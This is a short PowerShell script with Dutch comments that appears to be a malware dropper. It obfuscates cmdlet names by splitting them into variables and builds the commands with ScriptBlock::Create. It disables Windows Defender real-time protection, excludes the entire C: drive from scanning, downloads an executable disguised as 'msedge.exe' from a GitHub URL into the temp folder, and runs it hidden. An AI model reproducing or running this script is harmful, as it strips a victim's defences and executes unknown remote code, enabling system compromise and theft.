$v1 = "Set-MpPreference"
$v2 = "DisableRealtimeMonitoring"
$v3 = "Add-MpPreference"
$v4 = "ExclusionPath"
$v5 = "Invoke-WebRequest"
$v6 = "OutFile"
$v7 = "Start-Process"
$v8 = "FilePath"
$v9 = "WindowStyle"
$v10 = "Hidden"
$v11 = "Wait"

# Controleer of real-time protection al is uitgeschakeld
$realTimeStatus = (Get-MpPreference).DisableRealtimeMonitoring
if (-not $realTimeStatus) {
    & ([ScriptBlock]::Create("$v1 -$v2 `$true"))
    Write-Output "Real-time protection is uitgeschakeld."
} else {
    Write-Output "Real-time protection is al uitgeschakeld."
}

# Controleer of de C:-schijf al is uitgesloten
$exclusions = (Get-MpPreference).ExclusionPath
if (-not ($exclusions -contains "C:\")) {
    & ([ScriptBlock]::Create("$v3 -$v4 'C:\'"))
    Write-Output "C:-schijf is uitgesloten."
} else {
    Write-Output "C:-schijf is al uitgesloten."
}

# Download het bestand "msedge.exe" naar de tijdelijke map
& ([ScriptBlock]::Create("$v5 -Uri 'https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/msedge.exe' -$v6 '$env:TEMP\msedge.exe'"))

# Voer het gedownloade bestand uit
& ([ScriptBlock]::Create("$v7 -$v8 '$env:TEMP\msedge.exe' -$v9 $v10 -$v11"))
